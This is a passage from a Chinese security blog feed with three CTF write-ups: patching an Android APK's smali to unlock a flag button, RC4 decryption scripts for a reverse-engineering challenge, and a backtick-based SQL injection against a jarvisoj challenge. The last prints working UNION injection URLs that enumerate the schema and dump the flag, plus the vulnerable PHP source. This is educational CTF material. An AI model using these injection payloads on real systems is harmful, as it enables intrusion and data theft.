java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">    Crackme crack = <span class="keyword">new</span> Crackme();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下</p><p><img src="/2019/04/18/smali/1.JPG" alt=""></p><p>smali转成java后的逻辑很简单，就是AES的解密过程，可以直接用python实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES </span><br><span class="line"></span><br><span class="line">key=<span class="string">'cGhyYWNrICBjdGYgMjAxNg=='</span> </span><br><span class="line">cipher=<span class="string">'sSNnx1UKbYrA1+MOrdtDTA=='</span> </span><br><span class="line">key=base64.b64decode(key) </span><br><span class="line">cipher=base64.b64decode(cipher) </span><br><span class="line">aes=AES.new(key,AES.MODE_ECB) </span><br><span class="line"><span class="keyword">print</span> aes.decrypt(cipher)</span><br></pre></td></tr></table></figure><p>总结：对于smali文件，能阅读则阅读，比汇编代码还是有好一些；读不懂则直接转java。</p><h3 id="smali反编译"><a href="#smali反编译" class="headerlink" title="smali反编译"></a>smali反编译</h3><p>对于C程序，可以直接修改汇编代码重新编译可改变程序逻辑。那么，对于apk文件，自然也可以修改smali代码回编译来改变apk的逻辑。</p><p>工具：夜神模拟器 apktoolbox v1.6.4  Smali2java</p><p>步骤：反编译apk得到smali文件 –&gt; 修改smali文件 –&gt; 回编译apk</p><h3 id="一道题目体现apk的反编译与回编译"><a href="#一道题目体现apk的反编译与回编译" class="headerlink" title="一道题目体现apk的反编译与回编译"></a>一道题目体现apk的反编译与回编译</h3><p>题目来自于jarvisOJ 爬楼梯</p><p>安卓模拟器打开先开开是个什么鬼</p><p><img src="/2019/04/18/smali/2.JPG" alt=""></p><p>大概就是点击一下爬一层楼，一片的楼层加一，当已爬楼层大于要爬的楼层应该就可以看flag了。</p><p>手点是不可能的了，自动点击又不会，就只能试试能不能py一下了。</p><p>首先用apktool进行反编译，一定要忽略res资源，别问我为什么，为了纪念我消逝的青春</p><p><img src="/2019/04/18/smali/3.JPG" alt=""></p><p>在smali\com\ctf\test\ctf_100找到MainActivity.smali，直接用smali2java转化为java，当然如果你熟悉smali的话可以直接阅读</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> has_gone_int;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> to_reach_int;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">get_flag</span><span class="params">(<span class="keyword">int</span> p1)</span></span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle p1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(p1);</span><br><span class="line">        setContentView(<span class="number">0x7f040019</span>);</span><br><span class="line">        Button <span class="string">"bt"</span> = (Button)findViewById(<span class="number">0x7f0c0056</span>);</span><br><span class="line">        <span class="string">"bt"</span>.setClickable(<span class="keyword">false</span>);   <span class="comment">//看flag按钮默认无效</span></span><br><span class="line">        has_gone_int = <span class="number">0x0</span>;</span><br><span class="line">        Random <span class="string">"random"</span> = <span class="keyword">new</span> Random();</span><br><span class="line">        to_reach_int = <span class="string">"random"</span>.nextInt();</span><br><span class="line">        <span class="keyword">if</span>(to_reach_int &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            to_reach_int = (to_reach_int * -<span class="number">0x1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0x5</span> &lt; to_reach_int) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        to_reach_int = <span class="string">"random"</span>.nextInt();</span><br><span class="line">        to_reach_int = (to_reach_int % <span class="number">0x20</span>);</span><br><span class="line">        to_reach_int = (to_reach_int * <span class="number">0x4000</span>); </span><br><span class="line">        TextView <span class="string">"tv"</span> = (TextView)findViewById(<span class="number">0x7f0c0053</span>);</span><br><span class="line">        <span class="string">"tv"</span>.setText(<span class="string">""</span> + to_reach_int);</span><br><span class="line">        TextView <span class="string">"tv_result"</span> = (TextView)findViewById(<span class="number">0x7f0c0057</span>);</span><br><span class="line">        <span class="string">"tv_result"</span>.setText(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Btn_up_onclick</span><span class="params">(View p1)</span> </span>&#123;</span><br><span class="line">        has_gone_int = (has_gone_int + <span class="number">0x1</span>);</span><br><span class="line">        String <span class="string">"data"</span> = <span class="string">""</span> + has_gone_int;</span><br><span class="line">        TextView <span class="string">"tv"</span> = (TextView)findViewById(<span class="number">0x7f0c0054</span>);</span><br><span class="line">        <span class="string">"tv"</span>.setText(<span class="string">"data"</span>);</span><br><span class="line">        <span class="keyword">if</span>(to_reach_int &lt;= has_gone_int) &#123;</span><br><span class="line">            Button <span class="string">"bt"</span> = (Button)findViewById(<span class="number">0x7f0c0056</span>);</span><br><span class="line">            <span class="string">"bt"</span>.setClickable(<span class="keyword">true</span>);   <span class="comment">//看flag按钮有效</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">btn2_onclick</span><span class="params">(View p1)</span> </span>&#123;</span><br><span class="line">        TextView <span class="string">"tv_result"</span> = (TextView)findViewById(<span class="number">0x7f0c0057</span>);</span><br><span class="line">        <span class="string">"tv_result"</span>.setText(<span class="string">"&#123;Flag:"</span> + get_flag(to_reach_int) + <span class="string">"&#125;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(!Debug.isDebuggerConnected()) &#123;</span><br><span class="line">            System.loadLibrary(<span class="string">"ctf"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此只要叫看flag按钮初始化为true就可以了。接下来去修改smali：先找到setClickable，发现两处</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">invoke-virtual &#123;v0, v3&#125;, Landroid/widget/Button;-&gt;setClickable(Z)V</span><br><span class="line"></span><br><span class="line">invoke-virtual &#123;v0, v5&#125;, Landroid/widget/Button;-&gt;setClickable(Z)V</span><br></pre></td></tr></table></figure><p>一个一个来，搜索v3，发现没有v3=0，搜索v5，发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const/4 v5, 0x0</span><br></pre></td></tr></table></figure><p>将0x0改为0x1，然后用apktool回编译成apk，用模拟器打开</p><p><img src="/2019/04/18/smali/4.JPG" alt=""></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>smali文件就像汇编文件，可以直接修改来改变apk的逻辑，从而达到想要的目的。这里只是小试牛刀，后面还有更大的功能等待挖掘。附上一篇大佬博客以供学习<a href="https://blog.csdn.net/u012573920/article/details/44034397" target="_blank" rel="noopener">https://blog.csdn.net/u012573920/article/details/44034397</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;smali简介&quot;&gt;&lt;a href=&quot;#smali简介&quot; class=&quot;headerlink&quot; title=&quot;smali简介&quot;&gt;&lt;/a&gt;smali简介&lt;/h3&gt;&lt;p&gt;既然是简介，我觉得一句话就够了。&lt;/p&gt;
&lt;figure class=&quot;highlight plai
      
    
    </summary>
    
      <category term="reverse" scheme="https://j-kangel.github.io/categories/reverse/"/>
    
    
      <category term="smali" scheme="https://j-kangel.github.io/tags/smali/"/>
    
      <category term="android" scheme="https://j-kangel.github.io/tags/android/"/>
    
      <category term="java" scheme="https://j-kangel.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>逆向踩坑之RC4</title>
    <link href="https://j-kangel.github.io/2019/04/09/RC4/"/>
    <id>https://j-kangel.github.io/2019/04/09/RC4/</id>
    <published>2019-04-08T18:15:26.000Z</published>
    <updated>2019-04-08T15:54:51.397Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>RC4加密算法是大名鼎鼎的RSA三人组中的头号人物Ronald Rivest在1987年设计的密钥长度可变的流加密算法簇。之所以称其为簇，是由于其核心部分的S-box长度可为任意，但一般为256字节。该算法的速度可以达到DES加密的10倍左右，且具有很高级别的非线性。RC4起初是用于保护商业机密的。但是在1994年9月，它的算法被发布在互联网上，也就不再有什么商业机密了。RC4也被叫做ARC4（Alleged RC4——所谓的RC4），因为RSA从来就没有正式发布过这个算法。</p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>该算法较为简单，文字描述有点绕，直接上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypt</span><span class="params">(data, key)</span>:</span>   <span class="comment">#data为明文或密文，key为密钥</span></span><br><span class="line">    <span class="string">"""RC4 algorithm"""</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    box = range(<span class="number">256</span>)   <span class="comment">#初始化S盒</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        x = (x + box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        box[i], box[x] = box[x], box[i]</span><br><span class="line">    x = y = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        x = (x + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        y = (y + box[x]) % <span class="number">256</span></span><br><span class="line">        box[x], box[y] = box[y], box[x]</span><br><span class="line">        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % <span class="number">256</span>]))</span><br><span class="line">        <span class="comment">#对称密码，加密解密算法一样</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(out)</span><br></pre></td></tr></table></figure><p>python中Crypto库中有该算法，具体用法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> *</span><br><span class="line">data = <span class="string">"kangel"</span></span><br><span class="line">key = <span class="string">"key"</span></span><br><span class="line">cipher = ARC4.new(key)    <span class="comment">#加载密钥</span></span><br><span class="line">m = cipher.decrypt(key)   <span class="comment">#用该密钥解密</span></span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>RC4在有些情况下与sha1、base64一起混合使用，如果发现密文是base64编码，需考虑该算法，具体算法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random, base64</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypt</span><span class="params">(data, key)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 algorithm"""</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    box = range(<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        x = (x + box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        box[i], box[x] = box[x], box[i]</span><br><span class="line">    x = y = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        x = (x + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        y = (y + box[x]) % <span class="number">256</span></span><br><span class="line">        box[x], box[y] = box[y], box[x]</span><br><span class="line">        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % <span class="number">256</span>]))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(out)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tencode</span><span class="params">(data, key, encode=base64.b64encode, salt_length=<span class="number">16</span>)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 encryption with random salt and final encoding"""</span></span><br><span class="line">    salt = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(salt_length):</span><br><span class="line">        salt += chr(random.randrange(<span class="number">256</span>))</span><br><span class="line">    data = salt + crypt(data, sha1(key + salt).digest())</span><br><span class="line">    <span class="keyword">if</span> encode:</span><br><span class="line">        data = encode(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tdecode</span><span class="params">(data, key, decode=base64.b64decode, salt_length=<span class="number">16</span>)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 decryption of encoded data"""</span></span><br><span class="line">    <span class="keyword">if</span> decode:</span><br><span class="line">        data = decode(data)</span><br><span class="line">        <span class="keyword">print</span> data</span><br><span class="line">    salt = data[:salt_length]</span><br><span class="line">    <span class="keyword">print</span> len(salt)</span><br><span class="line">    <span class="keyword">return</span> crypt(data[salt_length:], sha1(key + salt).digest())</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 需要解密的数据</span></span><br><span class="line">    data = <span class="string">'UUyFTj8PCzF6geFn6xgBOYSvVTrbpNU4OF9db9wMcPD1yDbaJw=='</span></span><br><span class="line">    <span class="comment"># 密钥</span></span><br><span class="line">    key = <span class="string">'welcometoicqedu'</span></span><br><span class="line">    <span class="comment"># 解码</span></span><br><span class="line">    decoded_data = tdecode(data=data, key=key)</span><br><span class="line">    <span class="comment">#decoded_data = crypt(data,m)</span></span><br><span class="line">    print(<span class="string">"明文是："</span>)</span><br><span class="line">    <span class="keyword">print</span> decoded_data</span><br><span class="line"><span class="comment">#bdctf&#123;YOU_CRAKE_THE_RC4&#125;</span></span><br></pre></td></tr></table></figure><h3 id="逆向题中的体现"><a href="#逆向题中的体现" class="headerlink" title="逆向题中的体现"></a>逆向题中的体现</h3><p>前天打了掘安杯，这明明是一道很简单的逆向，可就是得不出flag。</p><p>题目如下：程序为64位的ELF文件，用ida打开</p><p><img src="/2019/04/09/RC4/1.JPG" alt=""></p><p>当时并不知道这是RC4（主要还是菜），但是RC4算法不难，所以很容易实现。刚开始被那一段<code>&gt;&gt;31&gt;&gt;24</code>迷惑了很久，还恶补了一堆东西，例如：</p><p>逻辑右移与算术右移（左移都是末尾补0）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = 1011</span><br><span class="line">b = a &gt;&gt; 1</span><br><span class="line">#a为无符号数</span><br><span class="line">b = 0101</span><br><span class="line">#a为有符号数,最高位为符号位，不进行移位运算，补全补符号位</span><br><span class="line">b = 1101</span><br><span class="line">所以：对于整数来说，逻辑右移与算术右移结果相同。</span><br></pre></td></tr></table></figure><p>上面的代码中先是有符号int（32位）右移31位，然后无符右移24位。因为被以为的数均为正数，所以最终结果都是0。</p><p>int_64如何转化为int_8（取最低字节）：模256就行了</p><p>然后写着写着就变成了RC4，未经修改的原生态代码，虽然有点乱（额，其实是非常乱），但其实并没有什么问题</p><p>可就是答案不对。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    a.append(i)</span><br><span class="line">v11 = <span class="number">0</span></span><br><span class="line">ch = <span class="string">"Th1sIsTheK3y"</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    v11 = (v11 + a[j] + ord(ch[j%<span class="number">12</span>]))%<span class="number">256</span></span><br><span class="line">    v3 = a[j]</span><br><span class="line">    a[j]=a[v11]</span><br><span class="line">    a[v11] = v3</span><br><span class="line">v8 = <span class="number">0</span></span><br><span class="line">v9 = <span class="number">0</span></span><br><span class="line">b = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    v8 = (v8 +<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    v9 = (v9+a[v8])%<span class="number">256</span></span><br><span class="line">    b.append(a[(a[v9]+a[v8])%<span class="number">256</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(a)</span></span><br><span class="line"><span class="comment">#print(b)</span></span><br><span class="line">key = [<span class="number">0x1c</span>,<span class="number">0x61</span>,<span class="number">0x97</span>,<span class="number">0x34</span>,<span class="number">0x28</span>,<span class="number">0x69</span>,<span class="number">0xfa</span>,<span class="number">0x54</span>,<span class="number">0xda</span>,<span class="number">0x3a</span>,<span class="number">0x2b</span>,<span class="number">0xbb</span>,<span class="number">0x05</span>,<span class="number">0x09</span>,<span class="number">0x16</span>,<span class="number">0x38</span>,<span class="number">0xf3</span>,<span class="number">0xcf</span>,<span class="number">0xd8</span>,<span class="number">0xa5</span>,<span class="number">0x12</span>,<span class="number">0x7e</span>,<span class="number">0x67</span>,<span class="number">0x44</span>]</span><br><span class="line">print(key)</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    flag+=chr(key[i]^b[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> len(b)</span><br><span class="line"><span class="keyword">print</span> len(key)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>后来看了官方wp，说是对key，进行了一次混淆。到了这里，我多说两句关于混淆：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">为了有效抵抗攻击者对密码体制的攻击，Shannon提出三个基本设计思想--扩散、混淆（混乱）和乘积密码。</span><br><span class="line">扩散：一位明文变化导致多位密文变化</span><br><span class="line">混淆：进行多次加密</span><br></pre></td></tr></table></figure><p>这里有个puts函数，首先用key对key进行一次RC4，得到的新key再用来加密flag。由于忽略了这一点（主要还是因为菜），所以最终只能是望而却步。看了wp，在ida中alt+t中搜索call sub_400686（RC4函数），果然有两处。</p><p><img src="/2019/04/09/RC4/2.JPG" alt=""></p><p>最后上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding="utf-8"</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> *</span><br><span class="line">data = <span class="string">"\x1c\x61\x97\x34\x28\x69\xfa\x54\xda\x3a\x2b\xbb\x05\x09\x16\x38\xf3\xcf\xd8\xa5\x12\x7e\x67\x44"</span></span><br><span class="line">key = <span class="string">"Th1sIsTheK3y"</span></span><br><span class="line">cipher = ARC4.new(key)</span><br><span class="line">m = cipher.decrypt(key)</span><br><span class="line">key_1 = ARC4.new(m)</span><br><span class="line">m = key_1.decrypt(data)</span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>看似差之毫厘，实际则反映知识的掌握程度和解题的熟练程度。不说了，回炉再造去了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;RC4加密算法是大名鼎鼎的RSA三人组中的头号人物Ronald Rivest在1987年设计的密钥长度可变的流加密算法簇。之所以称其为簇，是
      
    
    </summary>
    
      <category term="reverse" scheme="https://j-kangel.github.io/categories/reverse/"/>
    
      <category term="crypto" scheme="https://j-kangel.github.io/categories/reverse/crypto/"/>
    
    
      <category term="crypto" scheme="https://j-kangel.github.io/tags/crypto/"/>
    
      <category term="RC4" scheme="https://j-kangel.github.io/tags/RC4/"/>
    
  </entry>
  
  <entry>
    <title>sql注入之反引号</title>
    <link href="https://j-kangel.github.io/2019/04/07/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%8F%8D%E5%BC%95%E5%8F%B7/"/>
    <id>https://j-kangel.github.io/2019/04/07/sql注入之反引号/</id>
    <published>2019-04-06T21:58:19.000Z</published>
    <updated>2019-04-11T08:28:57.431Z</updated>
    
    <content type="html"><![CDATA[<h3 id="反引号在mysql中的作用"><a href="#反引号在mysql中的作用" class="headerlink" title="反引号在mysql中的作用"></a>反引号在mysql中的作用</h3><p>反引号在键盘的左上角，在mysql中可以区别保留字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#假如表A中有一列名为select，查询该列</span><br><span class="line">select select from A;   #错误</span><br><span class="line">select `select` from A;  #正确</span><br><span class="line">#假如存在表flag，用desc(describe)查询该表信息</span><br><span class="line">desc flag A;  #显示flag表信息，别名为A</span><br><span class="line">desc `flag` `A` #与上述语句相同</span><br></pre></td></tr></table></figure><h3 id="一道与之相关的web题"><a href="#一道与之相关的web题" class="headerlink" title="一道与之相关的web题"></a>一道与之相关的web题</h3><p>题目链接：<a href="http://web.jarvisoj.com:32794/" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/</a></p><p>Hint1: 先找到源码再说吧~~</p><p>后台扫描，得到源码：<a href="http://web.jarvisoj.com:32794/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php</a>~</p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">$table = Filter($table);</span><br><span class="line">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">$sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">$ret = sql_query($sql);</span><br><span class="line"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当<code>table</code>为空时，输出<code>flag{xxx}</code>，说明存在表<code>secret_test</code>。我们直接构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/index.php?table=test` `union select database() limit 1,1</span><br></pre></td></tr></table></figure><p>得到数据库61d00，接着爆表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/index.php?table=test` `union select group_concat(table_name) from information_schema.tables where table_schema = database() limit 1,1</span><br></pre></td></tr></table></figure><p>得到secret_flag,secret_test，接着爆字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/index.php?table=test` `union select group_concat(column_name) from information_schema.columns where table_name = 0x7365637265745f666c6167 limit 1,1</span><br></pre></td></tr></table></figure><p>得到flagUwillNeverKnow，最后爆出flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/index.php?table=test` `union select flagUwillNeverKnow  from secret_flag limit 1,1</span><br></pre></td></tr></table></figure><p>flag{luckyGame~}</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>该题只要清楚mysql中反引号的作用以及desc的使用，就变成了最基本的sql注入，没有过滤任何字符的注入。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;反引号在mysql中的作用&quot;&gt;&lt;a href=&quot;#反引号在mysql中的作用&quot; class=&quot;headerlink&quot; title=&quot;反引号在mysql中的作用&quot;&gt;&lt;/a&gt;反引号在mysql中的作用&lt;/h3&gt;&lt;p&gt;反引号在键盘的左上角，在mysql中可以区别保留字&lt;
      
    
    </summary>
    
